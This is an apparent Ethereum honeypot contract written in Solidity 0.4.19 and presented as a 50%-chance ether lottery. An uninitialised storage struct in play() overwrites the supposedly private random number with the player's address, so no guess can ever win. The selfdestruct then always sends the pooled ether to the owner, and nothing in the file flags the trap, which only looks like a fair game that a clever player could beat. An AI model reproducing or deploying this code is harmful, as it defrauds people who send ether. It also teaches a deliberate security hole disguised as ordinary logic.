 

 

pragma solidity ^0.4.19;
contract Lottery50chance
{
   
  uint256 private randomNumber = uint256( keccak256(now) ) % 2;
  uint256 public minBet = 1 ether;
  address owner = msg.sender;

  struct GameHistory 
  {
    address player;
    uint256 number;
  }
  
  GameHistory[] public log;

  modifier onlyOwner() 
  {
    require(msg.sender == owner);
    _;
  }

  function play(uint256 _number) 
  public 
  payable 
  {
      if(msg.value >= minBet && _number <= 1)
      {
          GameHistory gameHistory;
          gameHistory.player = msg.sender;
          gameHistory.number = _number;
          log.push(gameHistory);
          
           
           
       
          if (_number == randomNumber) 
          {
              selfdestruct(msg.sender);
          }else{
              selfdestruct(owner);
          }
          
      }
  }
  
   
  
  function withdraw(uint256 amount) 
  public 
  onlyOwner 
  {
    owner.transfer(amount);
  }

  function() public payable { }
  
}